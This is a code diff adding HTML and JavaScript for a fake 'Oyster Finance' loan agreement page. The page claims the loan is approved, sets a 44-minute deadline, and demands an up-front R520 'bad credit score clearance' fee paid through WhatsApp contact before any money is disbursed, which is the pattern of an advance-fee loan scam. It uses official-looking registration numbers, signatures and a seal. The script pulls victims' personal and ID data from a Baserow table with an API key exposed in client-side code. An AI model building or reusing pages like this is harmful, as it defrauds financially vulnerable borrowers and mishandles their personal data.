+                            <div class="page-header">
+                                <div style="text-align: center; margin: 0 0 20px 0;">
+                                    <span class="logo-text" style="font-size: clamp(20px, 4vw, 28px);">OYSTER</span>
+                                    <div class="logo-subtitle">FINANCE.</div>
+                                </div>
+                                <div class="page-title">Additional Loan Terms (For Your Protection)</div>
+                            </div>
+
+                            <ul class="feature-list">
+                                <li class="feature-item">
+                                    <div class="feature-icon">📥</div>
+                                    <div class="feature-content">
+                                        <div class="feature-title">How You Receive the Loan</div>
+                                        <p>Funds will be deposited directly to your personal bank account via secure bank transfer. Ensure you've submitted correct and verified banking details.</p>
+                                    </div>
+                                </li>
+
+                                <li class="feature-item">
+                                    <div class="feature-icon">📆</div>
+                                    <div class="feature-content">
+                                        <div class="feature-title">Repayment Grace Period</div>
+                                        <p>You won't start repaying immediately. Your first monthly repayment only begins three (3) months after the loan has been transferred. We offer this grace period to give you time to recover, plan, and breathe.</p>
+                                    </div>
+                                </li>
+
+                                <li class="feature-item">
+                                    <div class="feature-icon">📄</div>
+                                    <div class="feature-content">
+                                        <div class="feature-title">Agreement Timeline</div>
+                                        <p>Once your loan is transferred, you have 44 minutes to finalize any final compliance steps. Missing this step may delay the process or require additional verification.</p>
+                                    </div>
+                                </li>
+                            </ul>
+
+                            <div class="content-section">
+                                <p><strong>⚠️ Please note:</strong> If repayment terms are not met, we offer an extra 3-month grace period before any legal escalation, ensuring you have every chance to recover and repay comfortably.</p>
+                            </div>
+
+                            <div class="trust-section">
+                                <div class="trust-title">💼 Why Thousands Trust Oyster Personal Finance</div>
+                                <ul class="trust-list">
+                                    <li class="trust-item">
+                                        <span class="trust-icon">✅</span>
+                                        <strong>Registered & Transparent</strong> – NCRCP11356 Registered Credit Provider
+                                    </li>
+                                    <li class="trust-item">
+                                        <span class="trust-icon">✅</span>
+                                        <strong>Customer-First Approach</strong> – 24/7 human support team
+                                    </li>
+                                    <li class="trust-item">
+                                        <span class="trust-icon">✅</span>
+                                        <strong>Money-Back Guarantee</strong> – Fully refundable processing fee
+                                    </li>
+                                    <li class="trust-item">
+                                        <span class="trust-icon">✅</span>
+                                        <strong>Real Results</strong> – Hundreds of successful low-credit loan disbursements
+                                    </li>
+                                </ul>
+                            </div>
+
+                            <div class="highlight-box">
+                                <div class="highlight-title">Our Promise to You</div>
+                                <p><strong>We are not just giving loans—we are giving you a second chance.</strong> A chance to rebuild, regain financial independence, and move forward with dignity.</p>
+                            </div>
+
+                            <div class="content-section">
+                                <div class="subsection-title">Important Policy Note:</div>
+                                <p>We do not deduct the <span class="fee-highlight">BAD CREDIT SCORE CLEARANCE PROCESS FEE</span> from the principal loan amount, as this is against our policy. Kindly refrain from requesting such a deduction. All valid documents backing your loan will be provided.</p>
+                                
+                                <p style="margin-top: 15px;">We look forward to successfully completing this transaction with you in good faith.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Page 5: Signature Page -->
+                    <div class="document-page signature-page">
+                        <div class="page-content">
+                            <div class="page-header">
+                                <div style="text-align: center; margin: 0 0 20px 0;">
+                                    <span class="logo-text" style="font-size: clamp(20px, 4vw, 28px);">OYSTER</span>
+                                    <div class="logo-subtitle">FINANCE.</div>
+                                </div>
+                                <div class="page-title">Agreement Declaration & Signatures</div>
+                            </div>
+
+                            <div class="content-section">
+                                <p><strong>BAD Credit Score CLEARANCE PROCESS Fee:</strong> This fee serves as collateral for the loan in cases of unforeseen circumstances such as death, disability, terminal illness, or unemployment. The fee can be deposited into the company account. Your documents have been successfully verified, and your loan has been approved. Please contact us immediately with your banking details so that we can facilitate the processing of your approved loan.</p>
+                            </div>
+
+                            <div class="declaration-section">
+                                <p>I/We <input type="text" class="signature-input" placeholder="Enter your full name" id="applicantNameInput"> hereby declare that all information provided is, to the best of my/our knowledge, true, complete, and accurate. I/We understand that any information submitted which is found to be false or misleading may result in the disqualification of my/our application and the loss of eligibility for any further assistance from Oyster Finance.</p>
+                                
+                                <p style="margin-top: 15px;">Should any information be found to be false or misleading after the loan disbursement, it may result in the termination of the loan facility and require immediate full and final settlement of any outstanding amounts.</p>
+
+                                <div class="subsection-title" style="margin-top: 20px;">Important Note:</div>
+                                <p>Please be advised that we do not deduct the BAD Credit Score CLEARANCE PROCESS Fee from the loan amount, as this is strictly against our policy. Therefore, we request that you do not ask for any such deductions. Rest assured, we will provide you with all necessary and valid documentation to support your loan with our company.</p>
+
+                                <p style="margin-top: 15px;">We look forward to completing this transaction with you in good faith and to establishing a successful partnership.</p>
+                            </div>
+
+                            <div class="signature-area">
+                                <div class="signature-block">
+                                    <div class="signature-line">
+                                        <div class="signature-image">
+                                            <img src="https://placeholder.com/signature.png" alt="Parki Smith Signature" id="parkiSignatureImage" style="max-width: 100%; max-height: 100%; display: none;">
+                                            Paki Smith
+                                        </div>
+                                    </div>
+                                    <div class="signature-label">Signature</div>
+                                    <div class="signature-name"><strong>Paki Smith</strong></div>
+                                    <div class="signature-name">Managing Director</div>
+                                    <div class="signature-name">B.S.F LTD PTY</div>
+                                </div>
+
+                                <div class="signature-block">
+                                    <div class="signature-line">
+                                        <div style="position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%); width: 60px; height: 30px; background: #dc2626; border-radius: 15px; display: flex; align-items: center; justify-content: center; color: white; font-size: 10px;">APPROVED</div>
+                                    </div>
+                                    <div class="signature-label">Loan applicant</div>
+                                    <div class="signature-name" id="applicantName">Loading...</div>
+                                </div>
+                            </div>
+
+                            <div class="company-seal">
+                                <img src="https://placeholder.com/seal.png" alt="Company Seal" id="companySealImage" class="seal-image" style="display: none;">
+                                <div class="wax-seal-bottom" id="defaultSeal">SEAL</div>
+                            </div>
+
+                            <div class="company-footer">
+                                <strong>OYSTER PERSONAL FINANCE IS A REGISTERED CREDIT PROVIDER</strong><br>
+                                NCR Registration No.: NCRCP11356<br>
+                                Legal Registration No.: 2018/317490/07<br>
+                                <strong>Reach Out to us</strong><br>
+                                20 Georgian Crescent Bryanston East Hampton Office Park Johannesburg 2191<br><br>
+                                <strong>DATE: <span id="footerDate">Loading...</span></strong>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Zoom controls -->
+            <div class="zoom-controls">
+                <button class="zoom-btn" onclick="zoomOut()"><i class="fas fa-search-minus"></i></button>
+                <div class="zoom-level" id="zoomLevel">100%</div>
+                <button class="zoom-btn" onclick="zoomIn()"><i class="fas fa-search-plus"></i></button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment Modal -->
+    <div class="payment-modal" id="paymentModal">
+        <div class="payment-content">
+            <button class="payment-close" onclick="closePaymentModal()">&times;</button>
+            <div class="payment-title">Clear Your Credit & Repair Fee</div>
+            <div class="payment-text">
+                To proceed with the disbursement of your approved loan, please settle your R520 low credit clearance and repair fee.
+            </div>
+            <div class="payment-text">
+                Kindly contact our customer service to receive payment instructions:
+            </div>
+            <div class="contact-info">
+                <div class="contact-item">
+                    <span class="contact-icon"><i class="fas fa-envelope"></i></span>
+                    Email: support@oysterfinance.co.za
+                </div>
+                <div class="contact-item">
+                    <span class="contact-icon"><i class="fab fa-whatsapp"></i></span>
+                    WhatsApp: +27 71 234 5678
+                </div>
+            </div>
+            <div class="payment-text">
+                We're here to help you every step of the way.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Baserow API configuration
+        const BASEROW_API_URL = 'https://api.baserow.io/api/database/rows/table/';
+        const BASEROW_API_KEY = 'LG6hnTBxgBG78FueElsSwpHRd4Wep1oL';
+        const BASEROW_TABLE_ID = '561419';
+        const BASEROW_EMAIL_FIELD_ID = '4502368';
+        
+        // Image URLs - Replace these with your actual image URLs
+        const COMPANY_LOGO_URL = 'https://placeholder.com/logo.png';
+        const COMPANY_SEAL_URL = 'https://placeholder.com/seal.png';
+        const SIGNATURE_URL = 'https://placeholder.com/signature.png';
+        
+        // Current zoom level
+        let currentZoom = 1;
+        
+        // Interest rates based on loan type
+        const interestRates = {
+            "Home Loan": 10,
+            "Personal Loan": 3,
+            "Business Loan": 3,
+            "Vehicle Loan": 9,
+            "Emergency Loan": 12,
+            "Cash Loan": 3
+        };
+
+        // Field mapping for Baserow
+        const fieldMapping = {
+            firstName: 'name', // Field ID: 4501396
+            lastName: 'lastName', // Field ID: 4501397
+            email: 'Email', // Field ID: 4502368
+            idNumber: 'idNo', // Field ID: 4502424
+            loanAmount: 'loanAmount', // Field ID: 4501398
+            loanTerm: 'loanTearm', // Field ID: 4502389
+            loanType: 'loanType' // Not given in requirements but needed
+        };
+
+        // Calculate monthly repayment using amortization formula
+        function calculateMonthlyRepayment(principal, annualRate, months) {
+            if (annualRate === 0) {
+                return principal / months;
+            }
+            const monthlyRate = annualRate / 100 / 12;
+            const monthlyPayment = principal * (monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1);
+            return monthlyPayment;
+        }
+        
+        // Format currency
+        function formatCurrency(amount) {
+            return 'R' + amount.toLocaleString('en-ZA', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        }
+        
+        // Format date
+        function formatDate(dateString) {
+            const date = new Date(dateString);
+            return `${date.getMonth() + 1}/${date.getDate()}/${date.getFullYear()}`;
+        }
+
+        // Show error message
+        function showError(message) {
+            const errorDiv = document.getElementById('errorMessage');
+            const successDiv = document.getElementById('successMessage');
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+            successDiv.style.display = 'none';
+        }
+
+        // Show success message
+        function showSuccess(message) {
+            const errorDiv = document.getElementById('errorMessage');
+            const successDiv = document.getElementById('successMessage');
+            successDiv.textContent = message;
+            successDiv.style.display = 'block';
+            errorDiv.style.display = 'none';
+        }
+
+        // Hide messages
+        function hideMessages() {
+            document.getElementById('errorMessage').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'none';
+        }
+
+        // Set image sources and display them if URLs are valid
+        function setImageSources() {
+            // Company logo images
+            const logoImages = document.querySelectorAll('#companyLogoImage, #headerLogoImage');
+            logoImages.forEach(img => {
+                if (COMPANY_LOGO_URL && COMPANY_LOGO_URL !== 'https://placeholder.com/logo.png') {
+                    img.src = COMPANY_LOGO_URL;
+                    img.style.display = 'block';
+                }
+            });
+            
+            // Company seal images
+            const sealImages = document.querySelectorAll('#coverSealImage, #companySealImage');
+            sealImages.forEach(img => {
+                if (COMPANY_SEAL_URL && COMPANY_SEAL_URL !== 'https://placeholder.com/seal.png') {
+                    img.src = COMPANY_SEAL_URL;
+                    img.style.display = 'block';
+                    
+                    // Hide default seal if we have an image
+                    if (document.getElementById('defaultSeal')) {
+                        document.getElementById('defaultSeal').style.display = 'none';
+                    }
+                }
+            });
+            
+            // Signature image
+            const signatureImg = document.getElementById('parkiSignatureImage');
+            if (signatureImg && SIGNATURE_URL && SIGNATURE_URL !== 'https://placeholder.com/signature.png') {
+                signatureImg.src = SIGNATURE_URL;
+                signatureImg.style.display = 'block';
+                
+                // Hide text signature if we have an image
+                const signatureText = signatureImg.parentElement.textContent;
+                if (signatureText.includes('Paki Smith')) {
+                    signatureImg.parentElement.textContent = '';
+                    signatureImg.parentElement.appendChild(signatureImg);
+                }
+            }
+        }
+
+        // Fetch user data from Baserow by email
+        async function fetchUserDataFromBaserow(email) {
+            try {
+                // Use the email field ID to filter results
+                const filterUrl = `${BASEROW_API_URL}${BASEROW_TABLE_ID}/?user_field_names=true&filter__field_${BASEROW_EMAIL_FIELD_ID}__contains=${encodeURIComponent(email)}`;
+                
+                const response = await fetch(filterUrl, {
+                    method: 'GET',
+                    headers: {
+                        'Authorization': `Token ${BASEROW_API_KEY}`
+                    }
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`API Error: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                
+                // Check if we found any matching records
+                if (!data.results || data.results.length === 0) {
+                    return null;
+                }
+                
+                // Use the first matching record
+                const userRecord = data.results[0];
+                
+                // Extract user data with proper field mapping
+                return {
+                    firstName: userRecord[fieldMapping.firstName] || '',
+                    lastName: userRecord[fieldMapping.lastName] || '',
+                    fullName: `${userRecord[fieldMapping.firstName] || ''} ${userRecord[fieldMapping.lastName] || ''}`.trim() || 'Unknown User',
+                    idNumber: userRecord[fieldMapping.idNumber] || '',
+                    email: userRecord[fieldMapping.email] || email,
+                    loanAmount: parseFloat(userRecord[fieldMapping.loanAmount] || 0),
+                    loanDuration: parseInt(userRecord[fieldMapping.loanTerm] || 48),
+                    loanType: userRecord[fieldMapping.loanType] || 'Personal Loan',
+                    approvalDate: formatDate(new Date()),
+                    applicationDate: formatDate(new Date())
+                };
+                
+            } catch (error) {
+                console.error('Error fetching user data from Baserow:', error);
+                return null;
+            }
+        }
+
+        // Initialize document with user data
+        async function initializeDocument(userData) {
+            try {
+                // Calculate interest rate and monthly repayment
+                const interestRate = interestRates[userData.loanType] || 3;
+                const monthlyRepayment = calculateMonthlyRepayment(userData.loanAmount, interestRate, userData.loanDuration);
+                
+                // Use approval date or application date, ensuring persistence
+                const documentDate = userData.approvalDate || userData.applicationDate || formatDate(new Date());
+                
+                // Update all dynamic fields
+                document.getElementById('clientName').textContent = userData.fullName;
+                document.getElementById('clientName2').textContent = userData.fullName;
+                document.getElementById('loanAmount').textContent = formatCurrency(userData.loanAmount);
+                document.getElementById('loanAmountText').textContent = formatCurrency(userData.loanAmount);
+                document.getElementById('loanDuration').textContent = `${userData.loanDuration} Months`;
+                document.getElementById('loanDurationText').textContent = `${userData.loanDuration} Months`;
+                document.getElementById('monthlyRepayment').textContent = formatCurrency(monthlyRepayment);
+                document.getElementById('interestRate').textContent = `${interestRate}%`;
+                document.getElementById('approvalDate').textContent = documentDate;
+                document.getElementById('footerDate').textContent = documentDate;
+                
+                // Set placeholder for applicant name input
+                document.getElementById('applicantNameInput').placeholder = userData.fullName;
+                document.getElementById('applicantNameInput').value = userData.fullName;
+                document.getElementById('applicantName').textContent = userData.fullName;
+                
+                // Set image sources
+                setImageSources();
+                
+                // Store user data for PDF generation
+                window.currentUserData = userData;
+                
+            } catch (error) {
+                console.error('Error initializing document:', error);
+                throw error;
+            }
+        }
+
+        // Email verification form handler
+        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('userEmail').value.trim();
+            const verifyBtn = document.getElementById('verifyBtn');
+            
+            if (!email) {
+                showError('Please enter your email address.');
+                return;
+            }
+            
+            // Show loading state
+            const originalBtnText = verifyBtn.innerHTML;
+            verifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
+            verifyBtn.disabled = true;
+            hideMessages();
+            
+            try {
+                // Show loading overlay
+                document.getElementById('loadingOverlay').style.display = 'flex';
+                
+                // Fetch user data from Baserow
+                const userData = await fetchUserDataFromBaserow(email);
+                
+                if (!userData) {
+                    showError('Email not found in our records. Please check your email address and try again.');
+                    verifyBtn.innerHTML = originalBtnText;
+                    verifyBtn.disabled = false;
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    return;
+                }
+                
+                // Initialize document with user data
+                await initializeDocument(userData);
+                
+                // Hide verification modal and show document
+                document.getElementById('verificationModal').style.display = 'none';
+                document.getElementById('documentModal').style.display = 'flex';
+                
+                showSuccess('Document loaded successfully!');
+                
+            } catch (error) {
+                console.error('Verification error:', error);
+                showError('An error occurred while loading your document. Please try again.');
+                verifyBtn.innerHTML = originalBtnText;
+                verifyBtn.disabled = false;
+            } finally {
+                document.getElementById('loadingOverlay').style.display = 'none';
+            }
+        });
+
+        // Show payment modal
+        function showPaymentModal() {
+            document.getElementById('paymentModal').style.display = 'flex';
+        }
+
+        // Close payment modal
+        function closePaymentModal() {
+            document.getElementById('paymentModal').style.display = 'none';
+        }
+
+        // Close document and redirect to profile page
+        function closeDocument() {
+            if (confirm('Are you sure you want to close the document?')) {
+                window.location.href = 'profile.html';
+            }
+        }
+
+        // Zoom in function
+        function zoomIn() {
+            if (currentZoom < 2) {
+                currentZoom += 0.1;
+                applyZoom();
+            }
+        }
+
+        // Zoom out function
+        function zoomOut() {
+            if (currentZoom > 0.5) {
+                currentZoom -= 0.1;
+                applyZoom();
+            }
+        }
+
+        // Apply zoom level
+        function applyZoom() {
+            const pages = document.querySelectorAll('.document-page');
+            pages.forEach(page => {
+                page.style.transform = `scale(${currentZoom})`;
+            });
+            
+            document.getElementById('zoomLevel').textContent = `${Math.round(currentZoom * 100)}%`;
+        }
+
+        // Download PDF function
+        async function downloadPDF() {
+            try {
+                // Show loading overlay
+                document.getElementById('loadingOverlay').style.display = 'flex';
+                
+                const { jsPDF } = window.jspdf;
+                const pdf = new jsPDF('p', 'mm', 'a4');
+                
+                // Reset zoom for proper capture
+                const originalZoom = currentZoom;
+                currentZoom = 1;
+                applyZoom();
+                
+                const pages = document.querySelectorAll('.document-page');
+                
+                for (let i = 0; i < pages.length; i++) {
+                    if (i > 0) {
+                        pdf.addPage();
+                    }
+                    
+                    const canvas = await html2canvas(pages[i], {
+                        scale: 2,
+                        useCORS: true,
+                        allowTaint: true,
+                        logging: false
+                    });
+                    
+                    const imgData = canvas.toDataURL('image/png');
+                    const imgWidth = 210;
+                    const pageHeight = 295;
+                    const imgHeight = (canvas.height * imgWidth) / canvas.width;
+                    
+                    pdf.addImage(imgData, 'PNG', 0, 0, imgWidth, imgHeight);
+                }
+                
+                // Restore original zoom
+                currentZoom = originalZoom;
+                applyZoom();
+                
+                // Get user data for filename
+                const userData = window.currentUserData;
+                const fileName = userData ? 
+                    `Loan_Agreement_${userData.fullName.replace(/\s+/g, '_')}_${userData.approvalDate.replace(/\//g, '-')}.pdf` :
+                    'Loan_Agreement.pdf';
+                
+                pdf.save(fileName);
+                
+                // Hide loading overlay
+                document.getElementById('loadingOverlay').style.display = 'none';
+                
+            } catch (error) {
+                console.error('Error generating PDF:', error);
+                alert('An error occurred while generating the PDF. Please try again.');
+                document.getElementById('loadingOverlay').style.display = 'none';
+            }
+        }
+
+        // Initialize when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            // Show verification modal by default
+            document.getElementById('verificationModal').style.display = 'flex';
+            
+            // Set up image placeholders
+            setImageSources();
+            
+            // Set up applicant name input event listener
+            document.getElementById('applicantNameInput').addEventListener('input', function(e) {
+                document.getElementById('applicantName').textContent = e.target.value || 'Applicant Name';
+            });
+            
+            // Check if we're on a mobile device and adjust layout if needed
+            function checkMobileAndAdjust() {
+                if (window.innerWidth <= 480) {
+                    // For very small screens, adjust the document pages to be more readable
+                    document.querySelectorAll('.document-page').forEach(page => {
+                        page.style.minHeight = 'auto';
+                        page.style.height = 'auto';
+                    });
+                }
+            }
+            
+            // Run on load and resize
+            checkMobileAndAdjust();
+            window.addEventListener('resize', checkMobileAndAdjust);
+        });
+
+        // Close modals when clicking outside
+        document.getElementById('paymentModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closePaymentModal();
+            }
+        });
+
+        // Prevent closing main modal when clicking outside
+        document.getElementById('documentModal').addEventListener('click', function(e) {
+            e.stopPropagation();
+        });
+    </script>
+</body>
+</html>
